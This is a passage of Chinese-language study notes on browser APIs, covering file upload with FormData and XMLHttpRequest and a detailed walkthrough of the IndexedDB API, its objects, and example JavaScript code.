此外，还需要将表单`<form>`元素的`method`属性设为`POST`，`enctype`属性设为`multipart/form-data`。其中，`enctype`属性决定了 HTTP 头信息的`Content-Type`字段的值，默认情况下这个字段的值是`application/x-www-form-urlencoded`，但是文件上传的时候要改成`multipart/form-data`。

```html
<form method="post" enctype="multipart/form-data">
  <div>
    <label for="file">选择一个文件</label>
    <input type="file" id="file" name="myFile" multiple>
  </div>
  <div>
    <input type="submit" id="submit" name="submit_button" value="上传" />
  </div>
</form>
```

上面的 HTML 代码中，file 控件的`multiple`属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。

```js
var files = document.getElementById('file').files;
```

然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。

```js
var formData = new FormData();

for (var i = 0; i < files.length; i++) {
  var file = files[i];

  // 只上传图片文件
  if (!file.type.match('image.*')) {
    continue;
  }

  formData.append('photos[]', file, file.name);
}
```

最后，使用 Ajax 向服务器上传文件。

```js
var xhr = new XMLHttpRequest();
xhr.open('POST', 'handler.php', true);
xhr.onload = function () {
  if (xhr.status !== 200) {
    console.log('An error occurred!');
  }
};

xhr.send(formData);
```

除了发送 FormData 实例，也可以直接 AJAX 发送文件。

```js
var file = document.getElementById('test-input').files[0];
var xhr = new XMLHttpRequest();

xhr.open('POST', 'myserver/uploads');
xhr.setRequestHeader('Content-Type', file.type);
xhr.send(file);
```

### 10.14 IndexedDB API 

注意：IndexedDB实际工作中没用过，面试题中没遇到过，这里简单过一次。

#### 1、IndexedDB

##### 出现原因

数据量增大，如果数据存储在浏览器，那么不需要从服务器发送很多信息，直接从本地获取信息。现在本地存储中，cookie数据量很小（4k），每次请求必须携带cookie。LocalStorage 数据量2.5-10MB，不能搜索，不能建立自定义的索引。IndexedDB 类似浏览器提供的数据库，JS脚本可以操作数据库，不属于关系型数据库（不能用SQL语言查询），属于NoSQL数据库。

##### 特点

- 键值对存储，所有类型的数据（包括JS对象）可以转化成键值对（类似JSON？）存储。每一条数据记录对应唯一的主键
- 异步：数据库的读写和JS脚本是异步的，LocalStorage是同步任务，所以操作数据库不会阻塞脚本
- 支持事务 transaction 如果一个操作出现错误，那么整个事务会取消，已修改的数据会复原，不会出现修改一半的数据
- 同源限制，数据库对应单独的域名
- 存储量大，一半大于250MB
- 支持二进制数据 ArrayBuffer 或者Blob数据 

##### 分类

IndexDB 很复杂，包括下面的各种子对象和API。数据库中名词对应这个的对象。

- 数据库：IDB Database 对象：每一个URL可以对应多个数据库。IDB 有数据库的版本，同一时间内只能出现一个数据库，如果修改数据库的结构（增删数据表、索引或者主键）只有升级数据库的版本。
- 对象仓库：IDB ObjectStore 对象：一个数据库包括多个对象仓库（类似于关系型数据库中的数据表）
- 数据记录：类似于关系型数据库的行，包括主键和数据体，主键是默认的唯一的索引，可以是记录中的一个属性（ID），或者是一个自增长的整数编号。数据体的数据类型不限制。`{ id: 'qo9u', text: 'foo' }` 例如这个数据记录的主键是id，数据体是text。
- 索引： IDB Index 对象：为了加速数据检索，在数据表中为不同的属性建立索引。
- 事务： IDB Transaction 对象：数据的增删改通过事务完成
- 操作请求：IDB Request 对象
- 指针： IDB Cursor 对象
- 主键集合：IDB KeyRange 对象



#### 2、IDB 基本操作

##### 2.1 打开数据库

使用 IndexedDB 的第一步是打开数据库，使用`indexedDB.open()`方法。

```js
let request = window.indexedDB.open(dbName, version);
```

这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为`1`。

`indexedDB.open()`方法返回一个 IDBRequest 对象。这个对象通过三种事件`error`、`success`、`upgradeneeded`，处理打开数据库的操作结果。

**（1）error 事件**

`error`事件表示打开数据库失败。

```js
request.onerror = function (event) {
  console.log('数据库打开报错');
};
```

**（2）success 事件**

`success`事件表示成功打开数据库。

```js
var db;
request.onsuccess = function (event) {
  db = request.result;
  console.log('数据库打开成功');
};
```

这时，通过`request`对象的`result`属性拿到数据库对象。

**（3）upgradeneeded 事件**

如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件`upgradeneeded`。这时通过事件对象的`target.result`属性，拿到数据库实例。

```js
var db;
request.onupgradeneeded = function (event) {
  db = event.target.result;
}
```



##### 2.2 新建数据库

新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在`upgradeneeded`事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。

通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。

```js
request.onupgradeneeded = function(event) {  
  db = event.target.result;
  var objectStore = db.createObjectStore('person', { keyPath: 'id' });
}
```

上面代码中，数据库新建成功以后，新增一张叫做`person`的表，主键是`id`。

更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。

```js
request.onupgradeneeded = function (event) {
  db = event.target.result;
  var objectStore;
  if (!db.objectStoreNames.contains('person')) {
    objectStore = db.createObjectStore('person', { keyPath: 'id' });
  }
}
```

主键（key）是默认建立索引的属性。比如，数据记录是`{ id: 1, name: '张三' }`，那么`id`属性可以作为主键。主键也可以指定为下一层对象的属性，比如`{ foo: { bar: 'baz' } }`的`foo.bar`也可以指定为主键。

如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键（自增长）。

```js
var objectStore = db.createObjectStore('person', { autoIncrement: true });
```

上面代码中，指定主键为一个递增的整数。

新建对象仓库以后，下一步可以新建索引。

```js
request.onupgradeneeded = function(event) {
  db = event.target.result;
  var objectStore = db.createObjectStore('person', { keyPath: 'id' });
  objectStore.createIndex('name', 'name', { unique: false });
  objectStore.createIndex('email', 'email', { unique: true });
}
```

上面代码中，`IDBObject.createIndex()`的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。

##### 2.3 新增数据

新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。

```js
function add() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .add({ id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' });

  request.onsuccess = function (event) {
    console.log('数据写入成功');
  };

  request.onerror = function (event) {
    console.log('数据写入失败');
  }
}

add();
```

上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过`IDBTransaction.objectStore(name)`方法，拿到 IDBObjectStore 对象，再通过表格对象的`add()`方法，向表格写入一条记录。

写入操作是一个异步操作，通过监听连接对象的`success`事件和`error`事件，了解是否写入成功。

##### 2.4 读取数据

读取数据也是通过事务完成。

```js
function read() {
   var transaction = db.transaction(['person']);
   var objectStore = transaction.objectStore('person');
   var request = objectStore.get(1);

   request.onerror = function(event) {
     console.log('事务失败');
   };

   request.onsuccess = function(event) {
      if (request.result) {
        console.log('Name: ' + request.result.name);
        console.log('Age: ' + request.result.age);
        console.log('Email: ' + request.result.email);
      } else {
        console.log('未获得数据记录');
      }
   };
}

read();
```

上面代码中，`objectStore.get()`方法用于读取数据，参数是主键的值。

##### 2.5 遍历数据

遍历数据表格的所有记录，要使用指针对象 IDBCursor。

```js
function readAll() {
  var objectStore = db.transaction('person').objectStore('person');

  objectStore.openCursor().onsuccess = function (event) {
    var cursor = event.target.result;
    if (cursor) {
      console.log('Id: ' + cursor.key);
      console.log('Name: ' + cursor.value.name);
      console.log('Age: ' + cursor.value.age);
      console.log('Email: ' + cursor.value.email);
      cursor.continue();
    } else {
      console.log('没有更多数据了！');
    }
  };
}

readAll();
```

上面代码中，新建指针对象的`openCursor()`方法是一个异步操作，所以要监听`success`事件。

##### 2.6 更新数据

更新数据要使用`IDBObject.put()`方法。

```js
function update() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .put({ id: 1, name: '李四', age: 35, email: 'lisi@example.com' });

  request.onsuccess = function (event) {
    console.log('数据更新成功');
  };

  request.onerror = function (event) {
    console.log('数据更新失败');
  }
}

update();
```

上面代码中，`put()`方法自动更新了主键为`1`的记录。

##### 2.7 删除数据

`IDBObjectStore.delete()`方法用于删除记录。

```js
function remove() {
  var request = db.transaction(['person'], 'readwrite')
    .objectStore('person')
    .delete(1);

  request.onsuccess = function (event) {
    console.log('数据删除成功');
  };
}

remove();
```

##### 2.8 使用索引

索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。

假定新建表格的时候，对`name`字段建立了索引。

```
objectStore.createIndex('name', 'name', { unique: false });
```

现在，就可以从`name`找到对应的数据记录了。

```js
var transaction = db.transaction(['person'], 'readonly');
var store = transaction.objectStore('person');
var index = store.index('name');
var request = index.get('李四');

request.onsuccess = function (e) {
  var result = e.target.result;
  if (result) {
    // ...
  } else {
    // ...
  }
}
```



#### 3、indexedDB 对象 API

##### indexedDB.open()

`indexedDB.open()`方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。

```js
var openRequest = window.indexedDB.open('test', 1);
```

上面代码表示，打开一个名为`test`、版本为`1`的数据库。如果该数据库不存在，则会新建该数据库。

`open()`方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于`0`的正整数（`0`将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为`1`。

打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。

- **success**：打开成功。
- **error**：打开失败。
- **upgradeneeded**：第一次打开该数据库，或者数据库版本发生变化。
- **blocked**：上一次的数据库连接还未关闭。

第一次打开数据库时，会先触发`upgradeneeded`事件，然后触发`success`事件。

根据不同的需要，对上面4种事件监听函数。

```js
var openRequest = indexedDB.open('test', 1);
var db;

openRequest.onupgradeneeded = function (e) {
  console.log('Upgrading...');
}

openRequest.onsuccess = function (e) {
  console.log('Success!');
  db = openRequest.result;
}

openRequest.onerror = function (e) {
  console.log('Error');
  console.log(e);
}
```

上面代码有两个地方需要注意。首先，`open()`方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，`success`事件发生后，从`openRequest.result`属性可以拿到已经打开的`IndexedDB`数据库对象。

##### indexedDB.deleteDatabase()

`indexedDB.deleteDatabase()`方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个`IDBOpenDBRequest`对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，`IDBOpenDBRequest`对象可以监听以下事件。

- `success`：删除成功
- `error`：删除报错

```js
var DBDeleteRequest = window.indexedDB.deleteDatabase('demo');

DBDeleteRequest.onerror = function (event) {
  console.log('Error');
};

DBDeleteRequest.onsuccess = function (event) {
  console.log('success');
};
```

调用`deleteDatabase()`方法以后，当前数据库的其他已经打开的连接都会接收到`versionchange`事件。

注意，删除不存在的数据库并不会报错。

##### indexedDB.cmp()

`indexedDB.cmp()`方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：`0`表示相同，`1`表示第一个主键大于第二个主键，`-1`表示第一个主键小于第二个主键。

```
window.indexedDB.cmp(1, 2) // -1
```

注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。

```
window.indexedDB.cmp(1, true) // 报错
window.indexedDB.cmp({}, {}) // 报错
```

##### IDBRequest 对象

==IDBRequest 对象表示打开的数据库连接==，`indexedDB.open()`方法和`indexedDB.deleteDatabase()`方法会返回这个对象。数据库的操作都是通过这个对象完成的。

这个对象的所有操作都是异步操作，要通过`readyState`属性判断是否完成，如果为`pending`就表示操作正在进行，如果为`done`就表示操作完成，可能成功也可能失败。

操作完成以后，触发`success`事件或`error`事件，这时可以通过`result`属性和`error`属性拿到操作结果。如果在`pending`阶段，就去读取这两个属性，是会报错的。

IDBRequest 对象有以下属性。

- `IDBRequest.readyState`：等于`pending`表示操作正在进行，等于`done`表示操作正在完成。
- `IDBRequest.result`：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。
- `IDBRequest.error`：请求失败时，返回错误对象。
- `IDBRequest.source`：返回请求的来源（比如索引对象或 ObjectStore）。
- `IDBRequest.transaction`：返回当前请求正在进行的事务，如果不包含事务，返回`null`。
- `IDBRequest.onsuccess`：指定`success`事件的监听函数。
- `IDBRequest.onerror`：指定`error`事件的监听函数。

IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。

- `IDBOpenDBRequest.onblocked`：指定`blocked`事件（`upgradeneeded`事件触发时，数据库仍然在使用）的监听函数。
- `IDBOpenDBRequest.onupgradeneeded`：`upgradeneeded`事件的监听函数。

##### IDBDatabase 对象

打开数据成功以后，可以从`IDBOpenDBRequest`对象的`result`属性上面，拿到一个`IDBDatabase`对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。

```js
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onerror = function (event) {
  console.log('Error');
};

DBOpenRequest.onsuccess = function(event) {
  db = DBOpenRequest.result;
  // ...
};
```

IDBDatabase 对象有以下属性。

- `IDBDatabase.name`：字符串，数据库名称。
- `IDBDatabase.version`：整数，数据库版本。数据库第一次创建时，该属性为空字符串。
- `IDBDatabase.objectStoreNames`：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。
- `IDBDatabase.onabort`：指定 abort 事件（事务中止）的监听函数。
- `IDBDatabase.onclose`：指定 close 事件（数据库意外关闭）的监听函数。
- `IDBDatabase.onerror`：指定 error 事件（访问数据库失败）的监听函数。
- `IDBDatabase.onversionchange`：数据库版本变化时触发（发生`upgradeneeded`事件，或调用`indexedDB.deleteDatabase()`）。

下面是`objectStoreNames`属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的`contains`方法，检查数据库是否包含某个对象仓库。

```js
if (!db.objectStoreNames.contains('firstOS')) {
  db.createObjectStore('firstOS');
}
```

上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。

IDBDatabase 对象有以下方法。

- `IDBDatabase.close()`：关闭数据库连接，实际会等所有事务完成后再关闭。
- `IDBDatabase.createObjectStore()`：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在`versionchange`事件监听函数中调用。
- `IDBDatabase.deleteObjectStore()`：删除指定的对象仓库。该方法只能在`versionchange`事件监听函数中调用。
- `IDBDatabase.transaction()`：返回一个 IDBTransaction 事务对象。

下面是`createObjectStore()`方法的例子。

```js
var request = window.indexedDB.open('demo', 2);

request.onupgradeneeded = function (event) {
  var db = event.target.result;

  db.onerror = function(event) {
    console.log('error');
  };

  var objectStore = db.createObjectStore('items');

  // ...
};
```

上面代码创建了一个名为`items`的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的`objectStoreNames`属性，检查已有哪些对象仓库。

`createObjectStore()`方法还可以接受第二个对象参数，用来设置对象仓库的属性。

```
db.createObjectStore('test', { keyPath: 'email' });
db.createObjectStore('test2', { autoIncrement: true });
```

上面代码中，`keyPath`属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的`email`属性值都是不一样的），默认值为`null`；`autoIncrement`属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为`false`。一般来说，`keyPath`和`autoIncrement`属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少`keyPath`指定的属性。

下面是`deleteObjectStore()`方法的例子。

```
var dbName = 'sampleDB';
var dbVersion = 2;
var request = indexedDB.open(dbName, dbVersion);

request.onupgradeneeded = function(e) {
  var db = request.result;
  if (e.oldVersion < 1) {
    db.createObjectStore('store1');
  }

  if (e.oldVersion < 2) {
    db.deleteObjectStore('store1');
    db.createObjectStore('store2');
  }

  // ...
};
```

下面是`transaction()`方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。

```
var t = db.transaction(['items'], 'readwrite');
```

`transaction()`方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：`readonly`（只读）和`readwrite`（读写）。添加数据使用`readwrite`，读取数据使用`readonly`。第二个参数是可选的，省略时默认为`readonly`模式。

##### IDB Object Store 对象

IDBObjectStore 对象对应一个对象仓库（object store）。`IDBDatabase.createObjectStore()`方法返回的就是一个 IDBObjectStore 对象。

IDBDatabase 对象的`transaction()`返回一个事务对象，该对象的`objectStore()`方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。

```
db.transaction(['test'], 'readonly')
  .objectStore('test')
  .get(X)
  .onsuccess = function (e) {}
```

IDBObjectStore 对象有以下属性。

- `IDBObjectStore.indexNames`：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。
- `IDBObjectStore.keyPath`：返回当前对象仓库的主键。
- `IDBObjectStore.name`：返回当前对象仓库的名称。
- `IDBObjectStore.transaction`：返回当前对象仓库所属的事务对象。
- `IDBObjectStore.autoIncrement`：布尔值，表示主键是否会自动递增。

IDBObjectStore 对象有以下方法。

**（1）IDBObjectStore.add()**

`IDBObjectStore.add()`用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用`put()`方法。

```
objectStore.add(value, key)
```

该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为`null`。

创建事务以后，就可以获取对象仓库，然后使用`add()`方法往里面添加数据了。

```
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onsuccess = function (event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction(['items'], 'readwrite');

  transaction.oncomplete = function (event) {
    console.log('transaction success');
  };

  transaction.onerror = function (event) {
    console.log('transaction error: ' + transaction.error);
  };

  var objectStore = transaction.objectStore('items');
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log('add data success');
  };

};
```

**（2）IDBObjectStore.put()**

`IDBObjectStore.put()`方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。

```
objectStore.put(item, key)
```

该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。

**（3）IDBObjectStore.clear()**

`IDBObjectStore.clear()`删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。

```
objectStore.clear()
```

该方法不需要参数。

**（4）IDBObjectStore.delete()**

`IDBObjectStore.delete()`方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。

```
objectStore.delete(Key)
```

该方法的参数为主键的值。

**（5）IDBObjectStore.count()**

`IDBObjectStore.count()`方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。

```
IDBObjectStore.count(key)
```

不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。

**（6）IDBObjectStore.getKey()**

`IDBObjectStore.getKey()`用于获取主键。该方法返回一个 IDBRequest 对象。

```
objectStore.getKey(key)
```

该方法的参数可以是主键值或 IDBKeyRange 对象。

**（7）IDBObjectStore.get()**

`IDBObjectStore.get()`用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。

```
objectStore.get(key)
```

**（8）IDBObjectStore.getAll()**

`DBObjectStore.getAll()`用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。

```
// 获取所有记录
objectStore.getAll()

// 获取所有符合指定主键或 IDBKeyRange 的记录
objectStore.getAll(query)

// 指定获取记录的数量
objectStore.getAll(query, count)
```

**（9）IDBObjectStore.getAllKeys()**

`IDBObjectStore.getAllKeys()`用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。

```
// 获取所有记录的主键
objectStore.getAllKeys()

// 获取所有符合条件的主键
objectStore.getAllKeys(query)

// 指定获取主键的数量
objectStore.getAllKeys(query, count)
```

**（10）IDBObjectStore.index()**

`IDBObjectStore.index()`方法返回指定名称的索引对象 IDBIndex。

```
objectStore.index(name)
```

有了索引以后，就可以针对索引所在的属性读取数据。

```
var t = db.transaction(['people'], 'readonly');
var store = t.objectStore('people');
var index = store.index('name');

var request = index.get('foo');
```

上面代码打开对象仓库以后，先用`index()`方法指定获取`name`属性的索引，然后用`get()`方法读取某个`name`属性(`foo`)对应的数据。如果`name`属性不是对应唯一值，这时`get()`方法有可能取回多个数据对象。另外，`get()`是异步方法，读取成功以后，只能在`success`事件的监听函数中处理数据。

**（11）IDBObjectStore.createIndex()**

`IDBObjectStore.createIndex()`方法用于新建当前数据库的一个索引。该方法只能在`VersionChange`监听函数里面调用。

```
objectStore.createIndex(indexName, keyPath, objectParameters)
```

该方法可以接受三个参数。

- indexName：索引名
- keyPath：主键
- objectParameters：配置对象（可选）

第三个参数可以配置以下属性。

- unique：如果设为`true`，将不允许重复的值
- multiEntry：如果设为`true`，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。

假定对象仓库中的数据记录都是如下的`person`类型。

```
var person = {
  name: name,
  email: email,
  created: new Date()
};
```

可以指定这个对象的某个属性来建立索引。

```
var store = db.createObjectStore('people', { autoIncrement: true });

store.createIndex('name', 'name', { unique: false });
store.createIndex('email', 'email', { unique: true });
```

上面代码告诉索引对象，`name`属性不是唯一值，`email`属性是唯一值。

**（12）IDBObjectStore.deleteIndex()**

`IDBObjectStore.deleteIndex()`方法用于删除指定的索引。该方法只能在`VersionChange`监听函数里面调用。

```
objectStore.deleteIndex(indexName)
```

**（13）IDBObjectStore.openCursor()**

`IDBObjectStore.openCursor()`用于获取一个指针对象。

```
IDBObjectStore.openCursor()
```

指针对象可以用来遍历数据。该对象也是异步的，有自己的`success`和`error`事件，可以对它们指定监听函数。

```
var t = db.transaction(['test'], 'readonly');
var store = t.objectStore('test');

var cursor = store.openCursor();

cursor.onsuccess = function (event) {
  var res = event.target.result;
  if (res) {
    console.log('Key', res.key);
    console.dir('Data', res.value);
    res.continue();
  }
}
```

监听函数接受一个事件对象作为参数，该对象的`target.result`属性指向当前数据记录。该记录的`key`和`value`分别返回主键和键值（即实际存入的数据）。`continue()`方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向`null`。

`openCursor()`方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为`next`，其他可能的值为`prev`、`nextunique`和`prevunique`。后两个值表示如果遇到重复值，会自动跳过。

**（14）IDBObjectStore.openKeyCursor()**

`IDBObjectStore.openKeyCursor()`用于获取一个主键指针对象。

```
IDBObjectStore.openKeyCursor()
```

##### IDB Transaction 对象

IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。

`IDBDatabase.transaction()`方法返回的就是一个 IDBTransaction 对象。

```
var db;
var DBOpenRequest = window.indexedDB.open('demo', 1);

DBOpenRequest.onsuccess = function(event) {
  db = DBOpenRequest.result;
  var transaction = db.transaction(['demo'], 'readwrite');

  transaction.oncomplete = function (event) {
    console.log('transaction success');
  };

  transaction.onerror = function (event) {
    console.log('transaction error: ' + transaction.error);
  };

  var objectStore = transaction.objectStore('demo');
  var objectStoreRequest = objectStore.add({ foo: 1 });

  objectStoreRequest.onsuccess = function (event) {
    console.log('add data success');
  };

};
```

事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。

```
var trans1 = db.transaction('foo', 'readwrite');
var trans2 = db.transaction('foo', 'readwrite');
var objectStore2 = trans2.objectStore('foo')
var objectStore1 = trans1.objectStore('foo')
objectStore2.put('2', 'key');
objectStore1.put('1', 'key');
```

上面代码中，`key`对应的键值最终是`2`，而不是`1`。因为事务`trans1`先于`trans2`创建，所以首先执行。

注意，事务有可能失败，只有监听到事务的`complete`事件，才能保证事务操作成功。

IDBTransaction 对象有以下属性。

- `IDBTransaction.db`：返回当前事务所在的数据库对象 IDBDatabase。
- `IDBTransaction.error`：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回`null`。
- `IDBTransaction.mode`：返回当前事务的模式，默认是`readonly`（只读），另一个值是`readwrite`。
- `IDBTransaction.objectStoreNames`：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。
- `IDBTransaction.onabort`：指定`abort`事件（事务中断）的监听函数。
- `IDBTransaction.oncomplete`：指定`complete`事件（事务成功）的监听函数。
- `IDBTransaction.onerror`：指定`error`事件（事务失败）的监听函数。

IDBTransaction 对象有以下方法。

- `IDBTransaction.abort()`：终止当前事务，回滚所有已经进行的变更。
- `IDBTransaction.objectStore(name)`：返回指定名称的对象仓库 IDBObjectStore。

##### IDBIndex 对象

IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。

IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。

`IDBObjectStore.index()`方法可以获取 IDBIndex 对象。

```
var transaction = db.transaction(['contactsList'], 'readonly');
var objectStore = transaction.objectStore('contactsList');
var myIndex = objectStore.index('lName');

myIndex.openCursor().onsuccess = function (event) {
  var cursor = event.target.result;
  if (cursor) {
    var tableRow = document.createElement('tr');
    tableRow.innerHTML =   '<td>' + cursor.value.id + '</td>'
                         + '<td>' + cursor.value.lName + '</td>'
                         + '<td>' + cursor.value.fName + '</td>'
                         + '<td>' + cursor.value.jTitle + '</td>'
                         + '<td>' + cursor.value.company + '</td>'
                         + '<td>' + cursor.value.eMail + '</td>'
                         + '<td>' + cursor.value.phone + '</td>'
                         + '<td>' + cursor.value.age + '</td>';
    tableEntry.appendChild(tableRow);

    cursor.continue();
  } else {
    console.log('Entries all displayed.');
  }
};
```

IDBIndex 对象有以下属性。

- `IDBIndex.name`：字符串，索引的名称。
- `IDBIndex.objectStore`：索引所在的对象仓库。
- `IDBIndex.keyPath`：索引的主键。
- `IDBIndex.multiEntry`：布尔值，针对`keyPath`为数组的情况，如果设为`true`，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。
- `IDBIndex.unique`：布尔值，表示创建索引时是否允许相同的主键。

IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。

- `IDBIndex.count()`：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。
- `IDBIndex.get(key)`：用来获取符合指定主键的数据记录。
- `IDBIndex.getKey(key)`：用来获取指定的主键。
- `IDBIndex.getAll()`：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。
- `IDBIndex.getAllKeys()`：该方法与`IDBIndex.getAll()`方法相似，区别是获取所有主键。
- `IDBIndex.openCursor()`：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。
- `IDBIndex.openKeyCursor()`：该方法与`IDBIndex.openCursor()`方法相似，区别是遍历所有条目的主键。

##### IDBCursor 对象

IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。

IDBCursor 对象一般通过`IDBObjectStore.openCursor()`方法获得。

```js
var transaction = db.transaction(['rushAlbumList'], 'readonly');
var objectStore = transaction.objectStore('rushAlbumList');

objectStore.openCursor(null, 'next').onsuccess = function(event) {
  var cursor = event.target.result;
  if (cursor) {
    var listItem = document.createElement('li');
      listItem.innerHTML = cursor.value.albumTitle + ', ' + cursor.value.year;
      list.appendChild(listItem);

      console.log(cursor.source);
      cursor.continue();
    } else {
      console.log('Entries all displayed.');
    }
  };
};
```

IDBCursor 对象的属性。

- `IDBCursor.source`：返回正在遍历的对象仓库或索引。
- `IDBCursor.direction`：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过`IDBObjectStore.openCursor()`方法的第二个参数指定，一旦指定就不能改变了。
- `IDBCursor.key`：返回当前记录的主键。
- `IDBCursor.value`：返回当前记录的数据值。
- IDBCursor.primaryKey：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。

IDBCursor 对象有如下方法。

- `IDBCursor.advance(n)`：指针向前移动 n 个位置。
- `IDBCursor.continue()`：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。
- `IDBCursor.continuePrimaryKey()`：该方法需要两个参数，第一个是`key`，第二个是`primaryKey`，将指针移到符合这两个参数的位置。
- `IDBCursor.delete()`：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。
- `IDBCursor.update()`：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。

##### IDBKeyRange 对象

IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。

IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。

- `IDBKeyRange.lowerBound()`：指定下限。
- `IDBKeyRange.upperBound()`：指定上限。
- `IDBKeyRange.bound()`：同时指定上下限。
- `IDBKeyRange.only()`：指定只包含一个值。

下面是一些代码实例。

```js
// All keys ≤ x
var r1 = IDBKeyRange.upperBound(x);

// All keys < x
var r2 = IDBKeyRange.upperBound(x, true);

// All keys ≥ y
var r3 = IDBKeyRange.lowerBound(y);

// All keys > y
